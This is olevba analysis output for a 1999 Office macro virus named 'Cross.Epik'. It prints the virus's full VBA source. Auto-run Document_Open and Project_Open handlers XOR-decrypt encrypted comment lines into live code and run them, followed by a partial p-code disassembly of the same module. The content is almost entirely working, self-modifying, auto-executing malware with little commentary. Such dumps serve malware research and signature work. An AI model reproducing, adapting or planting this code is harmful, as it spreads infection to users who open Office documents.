olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Epic
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Epic - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'
'Cross.Epik
Private Sub Document_Open()
On Error Resume Next: Set objDoc = ThisDocument.VBProject.VBComponents(1).CodeModule
For y = 12 To 46: If Mid(objDoc.Lines(y, 1), 1, 1) = Chr(39) Then objDoc.ReplaceLine y, c(Mid(objDoc.Lines(y, 1), 2), Val(Mid(objDoc.Lines(58, 1), 2))) & Chr(39)
Next: o8: End Sub
Private Sub Project_Open()
On Error Resume Next: Set objProj = ThisProject.VBProject.VBComponents(1).CodeModule
For y = 12 To 46: If Mid(objProj.Lines(y, 1), 1, 1) = Chr(39) Then objProj.ReplaceLine y, c(Mid(objProj.Lines(y, 1), 2), Val(Mid(objProj.Lines(58, 1), 2))) & Chr(39)
Next: o9: End Sub
Private Sub o8()
'Ł‚Ě©žž�žĚľ‰ź™�‰Ě˘‰”�ÖĚż‰�Ě�Ž†¨�ŹĚŃĚ¸„…ź¨�Ź™�‰‚�Âş®Ľž�†‰Ź�Âş®Ż��ś�‚‰‚�źÄÝĹÂŻ��‰ˇ��™€‰
'�Ž†¨�ŹÂľ‰ś€ŤŹ‰ …‚‰ĚŮÔŔĚŻ„žÄßŐĹĚĘĚĄ‚�Äľ‚�ĚĆĚŘŮĹĚÇĚŢÜŮ
'Ş�žĚ•ĚŃĚÝĚ¸�ĚŘŰÖĚĄŠĚľ…‹„�Ä�Ž†¨�ŹÂ …‚‰źÄ•ŔĚÝĹŔĚÝĹĚŃĚŻ„žÄßŐĹĚ¸„‰‚Ě�Ž†¨�ŹÂľ‰ś€ŤŹ‰ …‚‰Ě•ŔĚŻ„žÄßŐĹĚĘĚŹÄ ‰Š�Ä�Ž†¨�ŹÂ …‚‰źÄ•ŔĚÝĹŔĚ ‰‚Ä�Ž†¨�ŹÂ …‚‰źÄ•ŔĚÝĹĹĚÁĚŢĹŔĚşŤ€Äˇ…�Ä�Ž†¨�ŹÂ …‚‰źÄŮÔŔĚÝĹŔĚŢĹĹĹ
'˘‰”�ÖĚż‰�Ě�Ž†Ľž�†ĚŃĚ«‰�ŁŽ†‰Ź�ÄŔĚÎˇżĽž�†‰Ź�Â­śś€…ŹŤ�…�‚ÎĹÂş®©Âş®Ľž�†‰Ź�źÄÝĹÂş®Ż��ś�‚‰‚�źÄÝĹÂŻ��‰ˇ��™€‰
'ĄŠĚ�Ž†Ľž�†ĚŃĚÎÎĚ¸„‰‚Ěż‰�Ě�Ž†Ľž�†ĚŃĚŻž‰Ť�‰ŁŽ†‰Ź�ÄÎˇżĽž�†‰Ź�Â­śś€…ŹŤ�…�‚ÎĹÂş®©Âş®Ľž�†‰Ź�źÄÝĹÂş®Ż��ś�‚‰‚�źÄÝĹÂŻ��‰ˇ��™€‰ÖĚšŤž˝™…�ĚŃĚÝ
'ĄŠĚ�Ž†Ľž�†Â …‚‰źÄŢŔĚÝĹĚĐŇĚÎËŻž�źźÂ©ś…‡ÎĚ¸„‰‚Ě�Ž†Ľž�†Â¨‰€‰�‰ …‚‰źĚÝŔĚ�Ž†Ľž�†ÂŻ�™‚�ŁŠ …‚‰źÖĚ�Ž†Ľž�†ÂĄ‚ź‰ž� …‚‰źĚÝŔĚ�Ž†¨�ŹÂ …‚‰źÄÝŔĚ�Ž†¨�ŹÂŻ�™‚�ŁŠ …‚‰źĹÖĚ�Ž†Ľž�†Âľ‰ś€ŤŹ‰ …‚‰ĚŰŔĚÎĽž…šŤ�‰Ěż™ŽĚĽž�†‰Ź�łŁś‰‚Ä®•şŤ€Ěś†Ě­źĚˇżĽž�†‰Ź�ÂĽž�†‰Ź�ĹÎ
'ĄŠĚ¸„…ź¨�Ź™�‰‚�ĚŃĚ­Ź�…š‰¨�Ź™�‰‚�Ě¸„‰‚Ěż‰�Ě�Ž†¤�ź�ĚŃĚ˘�ž�Ť€¸‰�ś€Ť�‰Ě©€ź‰Ěż‰�Ě�Ž†¤�ź�ĚŃĚ­Ź�…š‰¨�Ź™�‰‚�
'ż‰�Ě�Ž†¤�ź�ĚŃĚ�Ž†¤�ź�Âş®Ľž�†‰Ź�Âş®Ż��ś�‚‰‚�źÄÝĹÂŻ��‰ˇ��™€‰
'ĄŠĚ�Ž†¤�ź�Â …‚‰źÄŢŔĚÝĹĚĐŇĚÎËŻž�źźÂ©ś…‡ÎĚ¸„‰‚
'�Ž†¤�ź�Â¨‰€‰�‰ …‚‰źĚÝŔĚ�Ž†¤�ź�ÂŻ�™‚�ŁŠ …‚‰źÖĚ�Ž†¤�ź�ÂĄ‚ź‰ž� …‚‰źĚÝŔĚ�Ž†¨�ŹÂ …‚‰źÄÝŔĚ�Ž†¨�ŹÂŻ�™‚�ŁŠ …‚‰źĹ
'ĄŠĚ¸„…ź¨�Ź™�‰‚�ĚŃĚ˘�ž�Ť€¸‰�ś€Ť�‰Ě¸„‰‚Ě­Ź�…š‰¨�Ź™�‰‚�ÂżŤš‰­źĚ­Ź�…š‰¨�Ź™�‰‚�ÂŞ™€€˘Ť�‰ŔĚ›�Ş�ž�Ť�¨�Ź™�‰‚�
'©‚�ĚĄŠ
'ĄŠĚšŤž˝™…�ĚŃĚÝĚ¸„‰‚
'Ş�žĚ•ĚŃĚÝĚ¸�Ě¸Ťź‡źÂŻ�™‚�ÖĚĄŠĚĄ‚ż�žÄÝŔĚ¸Ťź‡źÄ•ĹÂ˘Ť�‰ŔĚÎˇ…Źž�ź�Š�ĚĽž�†‰Ź�ÎĹĚ¸„‰‚Ě¸Ťź‡źÄ•ĹÂŻ€�ź‰
'˘‰”�ÖĚ©‚�ĚĄŠ
'ĄŠĚĄ‚ż�žÄÝŔĚ¸…�‰ŔĚÎÚÎĹĚ¸„‰‚
'ˇź‹®�”ĚÎż„�™€�ĚĄĚ„�€�Ě�•Ě„‰Ť�Ě™śĚ„…‹„ÓĚŁžĚź„�™€�ĚĄĚŽž‰Ť‡Ě��›‚ĚŤ‚�ĚŹž•ÓÎĚĘĚšŽŻž ŠĚĘĚÎ»„Ť�ËźĚ•�™žĚ‰ś…‡ÓÎŔĚšŽ˝™‰ź�…�‚ŔĚÎ©ś…‡Î
'Ş�žĚ•ĚŃĚÝĚ¸�ĚÝÜÖĚż„‰€€ĚÎś…‚‹ĚÁ�ĚÁ€ĚÝÜÜÜÜĚÝÜÂÚÚÂÜÂÜÎŔĚšŽ¤…�‰ÖĚ˘‰”�ÖĚŞ�žĚ•ĚŃĚÝĚ¸�ĚÝÜÖĚż„‰€€ĚÎś…‚‹ĚÁ�ĚÁ€ĚÝÜÜÜÜĚÝÜÂŰÜÂÜÂÜÎŔĚšŽ¤…�‰ÖĚ˘‰”�
'©‚�ĚĄŠÖĚŁś�…�‚źÂş…ž™źĽž��‰Ź�…�‚ĚŃĚŞŤ€ź‰ÖĚŁś�…�‚źÂżŤš‰˘�ž�Ť€Ľž��ś�ĚŃĚŞŤ€ź‰
End Sub
Private Sub o9()
'Ł‚Ě©žž�žĚľ‰ź™�‰Ě˘‰”�ÖĚż‰�Ě�Ž†Ľž�†ĚŃĚ¸„…źĽž�†‰Ź�Âş®Ľž�†‰Ź�Âş®Ż��ś�‚‰‚�źÄÝĹÂŻ��‰ˇ��™€‰
'�Ž†Ľž�†Âľ‰ś€ŤŹ‰ …‚‰ĚŮÔŔĚŻ„žÄßŐĹĚĘĚĄ‚�Äľ‚�ĚĆĚŘŮĹĚÇĚŢÜŮ
'Ş�žĚ•ĚŃĚÝĚ¸�ĚŘŰÖĚĄŠĚľ…‹„�Ä�Ž†Ľž�†Â …‚‰źÄ•ŔĚÝĹŔĚÝĹĚŃĚŻ„žÄßŐĹĚ¸„‰‚Ě�Ž†Ľž�†Âľ‰ś€ŤŹ‰ …‚‰Ě•ŔĚŻ„žÄßŐĹĚĘĚŹÄ ‰Š�Ä�Ž†Ľž�†Â …‚‰źÄ•ŔĚÝĹŔĚ ‰‚Ä�Ž†Ľž�†Â …‚‰źÄ•ŔĚÝĹĹĚÁĚŢĹŔĚşŤ€Äˇ…�Ä�Ž†Ľž�†Â …‚‰źÄŮÔŔĚÝĹŔĚŢĹĹĹ
'˘‰”�ÖĚż‰�Ě�Ž†¨�ŹĚŃĚ«‰�ŁŽ†‰Ź�ÄŔĚÎ»�ž�Â­śś€…ŹŤ�…�‚ÎĹÂ˘�ž�Ť€¸‰�ś€Ť�‰Âş®Ľž�†‰Ź�Âş®Ż��ś�‚‰‚�źÄÝĹÂŻ��‰ˇ��™€‰
'ĄŠĚ�Ž†¨�ŹĚŃĚÎÎĚ¸„‰‚Ěż‰�Ě�Ž†¨�ŹĚŃĚŻž‰Ť�‰ŁŽ†‰Ź�ÄÎ»�ž�Â­śś€…ŹŤ�…�‚ÎĹÂş®Ľž�†‰Ź�Âş®Ż��ś�‚‰‚�źÄÝĹÂŻ��‰ˇ��™€‰ÖĚšŤž˝™…�ĚŃĚÝ
'ĄŠĚ�Ž†¨�ŹÂ …‚‰źÄŢŔĚÝĹĚĐŇĚÎËŻž�źźÂ©ś…‡ÎĚ¸„‰‚Ě�Ž†¨�ŹÂ¨‰€‰�‰ …‚‰źĚÝŔĚ�Ž†¨�ŹÂŻ�™‚�ŁŠ …‚‰źÖĚ�Ž†¨�ŹÂĄ‚ź‰ž� …‚‰źĚÝŔĚ�Ž†Ľž�†Â …‚‰źÄÝŔĚ�Ž†Ľž�†ÂŻ�™‚�ŁŠ …‚‰źĹÖĚ�Ž†¨�ŹÂľ‰ś€ŤŹ‰ …‚‰ĚŰŔĚÎĽž…šŤ�‰Ěż™ŽĚĽž�†‰Ź�łŁś‰‚ÄĹÎ
'šŤžŻ™žž‰‚�ĚŃĚ­Ź�…š‰Ľž�†‰Ź�Â˘Ť�‰ÖĚŞ�žĚ•ĚŃĚÝĚ¸�ĚĽž�†‰Ź�źÂŻ�™‚�ÖĚż‰�Ě�Ž†¤�ź�ĚŃĚĽž�†‰Ź�źÄ•ĹÂş®Ľž�†‰Ź�Âş®Ż��ś�‚‰‚�źÄÝĹÂŻ��‰ˇ��™€‰
'ĄŠĚ�Ž†¤�ź�Â …‚‰źÄŢŔĚÝĹĚĐŇĚÎËŻž�źźÂ©ś…‡ÎĚ¸„‰‚Ě�Ž†¤�ź�Â¨‰€‰�‰ …‚‰źĚÝŔĚ�Ž†¤�ź�ÂŻ�™‚�ŁŠ …‚‰źÖĚ�Ž†¤�ź�ÂĄ‚ź‰ž� …‚‰źĚÝŔĚ�Ž†Ľž�†Â …‚‰źÄÝŔĚ�Ž†Ľž�†ÂŻ�™‚�ŁŠ …‚‰źĹ
'Ş…€‰żŤš‰­źĚĽž�†‰Ź�źÄ•ĹÂŞ™€€˘Ť�‰
'˘‰”�ÖĚĽž�†‰Ź�źÄšŤžŻ™žž‰‚�ĹÂ­Ź�…šŤ�‰
'ĄŠĚĄ‚ż�žÄÝŔĚ¸…�‰ŔĚÎÚÎĹĚ¸„‰‚
'ˇź‹®�”ĚÎż„�™€�ĚĄĚ„�€�Ě�•Ě„‰Ť�Ě™śĚ„…‹„ÓĚŁžĚź„�™€�ĚĄĚŽž‰Ť‡Ě��›‚ĚŤ‚�ĚŹž•ÓÎĚĘĚšŽŻž ŠĚĘĚÎ»„Ť�ËźĚ•�™žĚ‰ś…‡ÓÎŔĚšŽ˝™‰ź�…�‚ŔĚÎ©ś…‡Î
'Ş�žĚ•ĚŃĚÝĚ¸�ĚÝÜÖĚż„‰€€ĚÎś…‚‹ĚÁ�ĚÁ€ĚÝÜÜÜÜĚÝÜÂÚÚÂÜÂÜÎŔĚšŽ¤…�‰ÖĚ˘‰”�ÖĚŞ�žĚ•ĚŃĚÝĚ¸�ĚÝÜÖĚż„‰€€ĚÎś…‚‹ĚÁ�ĚÁ€ĚÝÜÜÜÜĚÝÜÂŰÜÂÜÂÜÎŔĚšŽ¤…�‰ÖĚ˘‰”�
'©‚�ĚĄŠÖĚ­śś€…ŹŤ�…�‚ÂˇŤŹž�ş…ž™źĽž��‰Ź�…�‚ĚŃĚŞŤ€ź‰ÖĚŞ…€‰żŤš‰
End Sub
Private Function c(s, k): For y = 1 To Len(s): c = c & Chr(Asc(Mid(s, y, 1)) Xor k): Next: End Function
Private Sub Epik()
'Caress the needle brink in my eyes,
'the tears felt like rain.
'I watch the darkness hit the tides,
'and I'm dying...
'
'Epik (c) 1999 [LineZer0 Oldskewl Tribe]
'Hit the road jack, don't you come back...no more
End Sub
'236
'

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSOffice.Epic
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 8596 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1:
' 	QuoteRem 0x0000 0x000A "Cross.Epik"
' Line #2:
' 	FuncDefn (Private Sub Document_Open())
' Line #3:
' 	OnError (Resume Next) 
' 	BoS 0x0000 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set objDoc 
' Line #4:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x000C 
' 	LitDI2 0x002E 
' 	For 
' 	BoS 0x0000 
' 	Ld y 
' 	LitDI2 0x0001 
' 	Ld objDoc 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld y 
' 	Ld y 
' 	LitDI2 0x0001 
' 	Ld objDoc 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0002 
' 	LitDI2 0x003A 
' 	LitDI2 0x0001 
' 	Ld objDoc 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0002 
' 	ArgsLd Val 0x0001 
' 	ArgsLd c 0x0002 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld objDoc 
' 	ArgsMemCall ReplaceLine 0x0002 
' 	EndIf 
' Line #5:
' 	StartForVariable 
' 	Next 
' 	BoS 0x0000 
' 	ArgsCall o8 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #6:
' 	FuncDefn (Private Sub Project_Open())
' Line #7:
' 	OnError (Resume Next) 
' 	BoS 0x0000 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ThisProject 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set objProj 
' Line #8:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x000C 
' 	LitDI2 0x002E 
' 	For 
' 	BoS 0x0000 
' 	Ld y 
' 	LitDI2 0x0001 
' 	Ld objProj 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld y 
' 	Ld y 
' 	LitDI2 0x0001 
' 	Ld objProj 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0002 
' 	LitDI2 0x003A 
' 	LitDI2 0x0001 
' 	Ld objProj 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0002 
' 	ArgsLd Val 0x0001 
' 	ArgsLd c 0x0002 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld objProj 
' 	ArgsMemCall ReplaceLine 0x0002 
' 	EndIf 
' Line #9:
' 	StartForVariable 
' 	Next 
' 	BoS 0x0000 
' 	ArgsCall o9 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #10:
' 	FuncDefn (Private Sub o8())
' Line #11:
' 	QuoteRem 0x0000 0x0054 "Ł‚Ě©žž�žĚľ‰ź™�‰Ě˘‰”�ÖĚż‰�Ě�Ž†¨�ŹĚŃĚ¸„…ź¨�Ź™�‰‚�Âş®Ľž�†‰Ź�Âş®Ż��ś�‚‰‚�źÄÝĹÂŻ��‰ˇ��™€‰"
' Line #12:
' 	QuoteRem 0x0000 0x0034 "�Ž†¨�ŹÂľ‰ś€ŤŹ‰ …‚‰ĚŮÔŔĚŻ„žÄßŐĹĚĘĚĄ‚�Äľ‚�ĚĆĚŘŮĹĚÇĚŢÜŮ"
' Line #13:
' 	QuoteRem 0x0000 0x00BA "Ş�žĚ•ĚŃĚÝĚ¸�ĚŘŰÖĚĄŠĚľ…‹„�Ä�Ž†¨�ŹÂ …‚‰źÄ•ŔĚÝĹŔĚÝĹĚŃĚŻ„žÄßŐĹĚ¸„‰‚Ě�Ž†¨�ŹÂľ‰ś€ŤŹ‰ …‚‰Ě•ŔĚŻ„žÄßŐĹĚĘĚŹÄ ‰Š�Ä�Ž†¨�ŹÂ …‚‰źÄ•ŔĚÝĹŔĚ ‰‚Ä�Ž†¨�ŹÂ …‚‰źÄ•ŔĚÝĹĹĚÁĚŢĹŔĚşŤ€Äˇ…�Ä�Ž†¨�ŹÂ …‚‰źÄŮÔŔĚÝĹŔĚŢĹĹĹ"
' Line #14:
' 	QuoteRem 0x0000 0x0065 "˘‰”�ÖĚż‰�Ě�Ž†Ľž�†ĚŃĚ«‰�ŁŽ†‰Ź�ÄŔĚÎˇżĽž�†‰Ź�Â­śś€…ŹŤ�…�‚ÎĹÂş®©Âş®Ľž�†‰Ź�źÄÝĹÂş®Ż��ś�‚‰‚�źÄÝĹÂŻ��‰ˇ��™€‰"
' Line #15:
' 	QuoteRem 0x0000 0x0082 "ĄŠĚ�Ž†Ľž�†ĚŃĚÎÎĚ¸„‰‚Ěż‰�Ě�Ž†Ľž�†ĚŃĚŻž‰Ť�‰ŁŽ†‰Ź�ÄÎˇżĽž�†‰Ź�Â­śś€…ŹŤ�…�‚ÎĹÂş®©Âş®Ľž�†‰Ź�źÄÝĹÂş®Ż��ś�‚‰‚�źÄÝĹÂŻ��‰ˇ��™€‰ÖĚšŤž˝™…�ĚŃĚÝ"
' Line #16:
' 	QuoteRem 0x0000 0x00E7 "ĄŠĚ�Ž†Ľž�†Â …‚‰źÄŢŔĚÝĹĚĐŇĚÎËŻž�źźÂ©ś…‡ÎĚ¸„‰‚Ě�Ž†Ľž�†Â¨‰€‰�‰ …‚‰źĚÝŔĚ�Ž†Ľž�†ÂŻ�™‚�ŁŠ …‚‰źÖĚ�Ž†Ľž�†ÂĄ‚ź‰ž� …‚‰źĚÝŔĚ�Ž†¨�ŹÂ …‚‰źÄÝŔĚ�Ž†¨�ŹÂŻ�™‚�ŁŠ …‚‰źĹÖĚ�Ž†Ľž�†Âľ‰ś€ŤŹ‰ …‚‰ĚŰŔĚÎĽž…šŤ�‰Ěż™ŽĚĽž�†‰Ź�łŁś‰‚Ä®•şŤ€Ěś†Ě­źĚˇżĽž�†‰Ź�ÂĽž�†‰Ź�ĹÎ"
' Line #17:
' 	QuoteRem 0x0000 0x0064 "ĄŠĚ¸„…ź¨�Ź™�‰‚�ĚŃĚ­Ź�…š‰¨�Ź™�‰‚�Ě¸„‰‚Ěż‰�Ě�Ž†¤�ź�ĚŃĚ˘�ž�Ť€¸‰�ś€Ť�‰Ě©€ź‰Ěż‰�Ě�Ž†¤�ź�ĚŃĚ­Ź�…š‰¨�Ź™�‰‚�"
' Line #18:
' 	QuoteRem 0x0000 0x003A "ż‰�Ě�Ž†¤�ź�ĚŃĚ�Ž†¤�ź�Âş®Ľž�†‰Ź�Âş®Ż��ś�‚‰‚�źÄÝĹÂŻ��‰ˇ��™€‰"
' Line #19:
' 	QuoteRem 0x0000 0x002C "ĄŠĚ�Ž†¤�ź�Â …‚‰źÄŢŔĚÝĹĚĐŇĚÎËŻž�źźÂ©ś…‡ÎĚ¸„‰‚"
' Line #20:
' 	QuoteRem 0x0000 0x0068 "�Ž†¤�ź�Â¨‰€‰�‰ …‚‰źĚÝŔĚ�Ž†¤�ź�ÂŻ�™‚�ŁŠ …‚‰źÖĚ�Ž†¤�ź�ÂĄ‚ź‰ž� …‚‰źĚÝŔĚ�Ž†¨�ŹÂ …‚‰źÄÝŔĚ�Ž†¨�ŹÂŻ�™‚�ŁŠ …‚‰źĹ"
' Line #21:
' 	QuoteRem 0x0000 0x0065 "ĄŠĚ¸„…ź¨�Ź™�‰‚�ĚŃĚ˘�ž�Ť€¸‰�ś€Ť�‰Ě¸„‰‚Ě­Ź�…š‰¨�Ź™�‰‚�ÂżŤš‰­źĚ­Ź�…š‰¨�Ź™�‰‚�ÂŞ™€€˘Ť�‰ŔĚ›�Ş�ž�Ť�¨�Ź™�‰‚�"
' Line #22:
' 	QuoteRem 0x0000 0x0006 "©‚�ĚĄŠ"
' Line #23:
' 	QuoteRem 0x0000 0x0013 "ĄŠĚšŤž˝™…�ĚŃĚÝĚ¸„‰‚"
' Line #24:
' 	QuoteRem 0x0000 0x005D "Ş�žĚ•ĚŃĚÝĚ¸�Ě¸Ťź‡źÂŻ�™‚�ÖĚĄŠĚĄ‚ż�žÄÝŔĚ¸Ťź‡źÄ•ĹÂ˘Ť�‰ŔĚÎˇ…Źž�ź�Š�ĚĽž�†‰Ź�ÎĹĚ¸„‰‚Ě¸Ťź‡źÄ•ĹÂŻ€�ź‰"
' Line #25:
' 	QuoteRem 0x0000 0x000C "˘‰”�ÖĚ©‚�ĚĄŠ"
' Line #26:
' 	QuoteRem 0x0000 0x001B "ĄŠĚĄ‚ż�žÄÝŔĚ¸…�‰ŔĚÎÚÎĹĚ¸„‰‚"
' Line #27:
' 	QuoteRem 0x0000 0x007A "ˇź‹®�”ĚÎż„�™€�ĚĄĚ„�€�Ě�•Ě„‰Ť�Ě™śĚ„…‹„ÓĚŁžĚź„�™€�ĚĄĚŽž‰Ť‡Ě��›‚ĚŤ‚�ĚŹž•ÓÎĚĘĚšŽŻž ŠĚĘĚÎ»„Ť�ËźĚ•�™žĚ‰ś…‡ÓÎŔĚšŽ˝™‰ź�…�‚ŔĚÎ©ś…‡Î"
' Line #28:
' 	QuoteRem 0x0000 0x0084 "Ş�žĚ•ĚŃĚÝĚ¸�ĚÝÜÖĚż„‰€€ĚÎś…‚‹ĚÁ�ĚÁ€ĚÝÜÜÜÜĚÝÜÂÚÚÂÜÂÜÎŔĚšŽ¤…�‰ÖĚ˘‰”�ÖĚŞ�žĚ•ĚŃĚÝĚ¸�ĚÝÜÖĚż„‰€€ĚÎś…‚‹ĚÁ�ĚÁ€ĚÝÜÜÜÜĚÝÜÂŰÜÂÜÂÜÎŔĚšŽ¤…�‰ÖĚ˘‰”�"
' Line #29:
' 	QuoteRem 0x0000 0x0049 "©‚�ĚĄŠÖĚŁś�…�‚źÂş…ž™źĽž��‰Ź�…�‚ĚŃĚŞŤ€ź‰ÖĚŁś�…�‚źÂżŤš‰˘�ž�Ť€Ľž��ś�ĚŃĚŞŤ€ź‰"
' Line #30:
' 	EndSub 
' Line #31:
' 	FuncDefn (Private Sub o9())
' Line #32:
' 	QuoteRem 0x0000 0x0054 "Ł‚Ě©žž�žĚľ‰ź™�‰Ě˘‰”�ÖĚż‰�Ě�Ž†Ľž�†ĚŃĚ¸„…źĽž�†‰Ź�Âş®Ľž�†‰Ź�Âş®Ż��ś�‚‰‚�źÄÝĹÂŻ��‰ˇ��™€‰"
' Line #33:
' 	QuoteRem 0x0000 0x0035 "�Ž†Ľž�†Âľ‰ś€ŤŹ‰ …‚‰ĚŮÔŔĚŻ„žÄßŐĹĚĘĚĄ‚�Äľ‚�ĚĆĚŘŮĹĚÇĚŢÜŮ"
' Line #34:
' 	QuoteRem 0x0000 0x00BF "Ş�žĚ•ĚŃĚÝĚ¸�ĚŘŰÖĚĄŠĚľ…‹„�Ä�Ž†Ľž�†Â …‚‰źÄ•ŔĚÝĹŔĚÝĹĚŃĚŻ„žÄßŐĹĚ¸„‰‚Ě�Ž†Ľž�†Âľ‰ś€ŤŹ‰ …‚‰Ě•ŔĚŻ„žÄßŐĹĚĘĚŹÄ ‰Š�Ä�Ž†Ľž�†Â …‚‰źÄ•ŔĚÝĹŔĚ ‰‚Ä�Ž†Ľž�†Â …‚‰źÄ•ŔĚÝĹĹĚÁĚŢĹŔĚşŤ€Äˇ…�Ä�Ž†Ľž�†Â …‚‰źÄŮÔŔĚÝĹŔĚŢĹĹĹ"
' Line #35:
' 	QuoteRem 0x0000 0x0066 "˘‰”�ÖĚż‰�Ě�Ž†¨�ŹĚŃĚ«‰�ŁŽ†‰Ź�ÄŔĚÎ»�ž�Â­śś€…ŹŤ�…�‚ÎĹÂ˘�ž�Ť€¸‰�ś€Ť�‰Âş®Ľž�†‰Ź�Âş®Ż��ś�‚‰‚�źÄÝĹÂŻ��‰ˇ��™€‰"
' Line #36:
' 	QuoteRem 0x0000 0x0073 "ĄŠĚ�Ž†¨�ŹĚŃĚÎÎĚ¸„‰‚Ěż‰�Ě�Ž†¨�ŹĚŃĚŻž‰Ť�‰ŁŽ†‰Ź�ÄÎ»�ž�Â­śś€…ŹŤ�…�‚ÎĹÂş®Ľž�†‰Ź�Âş®Ż��ś�‚‰‚�źÄÝĹÂŻ��‰ˇ��™€‰ÖĚšŤž˝™…�ĚŃĚÝ"
' Line #37:
' 	QuoteRem 0x0000 0x00C7 "ĄŠĚ�Ž†¨�ŹÂ …‚‰źÄŢŔĚÝĹĚĐŇĚÎËŻž�źźÂ©ś…‡ÎĚ¸„‰‚Ě�Ž†¨�ŹÂ¨‰€‰�‰ …‚‰źĚÝŔĚ�Ž†¨�ŹÂŻ�™‚�ŁŠ …‚‰źÖĚ�Ž†¨�ŹÂĄ‚ź‰ž� …‚‰źĚÝŔĚ�Ž†Ľž�†Â …‚‰źÄÝŔĚ�Ž†Ľž�†ÂŻ�™‚�ŁŠ …‚‰źĹÖĚ�Ž†¨�ŹÂľ‰ś€ŤŹ‰ …‚‰ĚŰŔĚÎĽž…šŤ�‰Ěż™ŽĚĽž�†‰Ź�łŁś‰‚ÄĹÎ"
' Line #38:
' 	QuoteRem 0x0000 0x007C "šŤžŻ™žž‰‚�ĚŃĚ­Ź�…š‰Ľž�†‰Ź�Â˘Ť�‰ÖĚŞ�žĚ•ĚŃĚÝĚ¸�ĚĽž�†‰Ź�źÂŻ�™‚�ÖĚż‰�Ě�Ž†¤�ź�ĚŃĚĽž�†‰Ź�źÄ•ĹÂş®Ľž�†‰Ź�Âş®Ż��ś�‚‰‚�źÄÝĹÂŻ��‰ˇ��™€‰"
' Line #39:
' 	QuoteRem 0x0000 0x0097 "ĄŠĚ�Ž†¤�ź�Â …‚‰źÄŢŔĚÝĹĚĐŇĚÎËŻž�źźÂ©ś…‡ÎĚ¸„‰‚Ě�Ž†¤�ź�Â¨‰€‰�‰ …‚‰źĚÝŔĚ�Ž†¤�ź�ÂŻ�™‚�ŁŠ …‚‰źÖĚ�Ž†¤�ź�ÂĄ‚ź‰ž� …‚‰źĚÝŔĚ�Ž†Ľž�†Â …‚‰źÄÝŔĚ�Ž†Ľž�†ÂŻ�™‚�ŁŠ …‚‰źĹ"
' Line #40:
' 	QuoteRem 0x0000 0x001F "Ş…€‰żŤš‰­źĚĽž�†‰Ź�źÄ•ĹÂŞ™€€˘Ť�‰"
' Line #41:
' 	QuoteRem 0x0000 0x0023 "˘‰”�ÖĚĽž�†‰Ź�źÄšŤžŻ™žž‰‚�ĹÂ­Ź�…šŤ�‰"
' Line #42:
' 	QuoteRem 0x0000 0x001B "ĄŠĚĄ‚ż�žÄÝŔĚ¸…�‰ŔĚÎÚÎĹĚ¸„‰‚"
' Line #43:
' 	QuoteRem 0x0000 0x007A "ˇź‹®�”ĚÎż„�™€�ĚĄĚ„�€�Ě�•Ě„‰Ť�Ě™śĚ„…‹„ÓĚŁžĚź„�™€�ĚĄĚŽž‰Ť‡Ě��›‚ĚŤ‚�ĚŹž•ÓÎĚĘĚšŽŻž ŠĚĘĚÎ»„Ť�ËźĚ•�™žĚ‰ś…‡ÓÎŔĚšŽ˝™‰ź�…�‚ŔĚÎ©ś…‡Î"
' Line #44:
' 	QuoteRem 0x0000 0x0084 "Ş�žĚ•ĚŃĚÝĚ¸�ĚÝÜÖĚż„‰€€ĚÎś…‚‹ĚÁ�ĚÁ€ĚÝÜÜÜÜĚÝÜÂÚÚÂÜÂÜÎŔĚšŽ¤…�‰ÖĚ˘‰”�ÖĚŞ�žĚ•ĚŃĚÝĚ¸�ĚÝÜÖĚż„‰€€ĚÎś…‚‹ĚÁ�ĚÁ€ĚÝÜÜÜÜĚÝÜÂŰÜÂÜÂÜÎŔĚšŽ¤…�‰ÖĚ˘‰”�"
' Line #45:
' 	QuoteRem 0x0000 0x003A "©‚�ĚĄŠÖĚ­śś€…ŹŤ�…�‚ÂˇŤŹž�ş…ž™źĽž��‰Ź�…�‚ĚŃĚŞŤ€ź‰ÖĚŞ…€‰żŤš‰"
' Line #46:
' 	EndSub 
' Line #47:
' 	FuncDefn (Private Function c(s, k, id_FFFE As Variant))
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0001 
